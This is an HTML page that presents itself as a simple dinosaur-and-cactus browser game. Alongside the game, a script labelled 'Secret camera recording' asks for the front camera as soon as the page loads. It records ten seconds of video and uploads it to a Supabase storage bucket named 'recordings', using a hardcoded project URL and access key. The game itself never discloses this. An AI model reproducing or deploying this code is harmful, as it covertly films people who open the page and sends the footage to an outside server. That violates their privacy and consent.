<!DOCTYPE html>
<html>
<head>
    <title>Dino Game with Secret Camera Upload</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: url('Background.png.png') no-repeat center center fixed;
            background-size: cover;
        }
        canvas {
            display: block;
            margin: auto;
            background: rgba(255, 255, 255, 0.2);
            border: 2px solid #333;
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas" width="800" height="600"></canvas>

    <script type="module">
        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");

        const dinosaurImg = new Image();
        dinosaurImg.src = "Dinasour.png.png";

        const cactusImg = new Image();
        cactusImg.src = "Cactus.png.png";

        let dinoX = 50, dinoY = 500;
        let cactusX = 800, cactusY = 500;

        function draw() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(dinosaurImg, dinoX, dinoY, 80, 80);
            ctx.drawImage(cactusImg, cactusX, cactusY, 50, 80);

            cactusX -= 5;
            if (cactusX < -50) cactusX = 800;

            requestAnimationFrame(draw);
        }

        draw();

        // 🎥 Secret camera recording
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: "video/webm" });
                    const fileName = `dino-cam-${Date.now()}.webm`;

                    // Upload to Supabase
                    const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
                    const supabase = createClient(
                        'https://xtjwkxstpvkqcjewmjva.supabase.co',
                        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0andreHN0cHZrcWNqZXdtanZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ3MDE0NjIsImV4cCI6MjA2MDI3NzQ2Mn0.-EdKJxRrJTLgrcvqn7-4xZJmdMBexINdP3430EE5nXo'
                    );

                    const { data, error } = await supabase.storage
                        .from('recordings')
                        .upload(fileName, blob, {
                            contentType: 'video/webm'
                        });

                    if (error) {
                        console.error("❌ Upload failed:", error);
                    } else {
                        console.log("✅ Video uploaded:", data);
                    }
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds
            })
            .catch(err => {
                console.error("Camera error:", err);
            });
    </script>
</body>
</html>
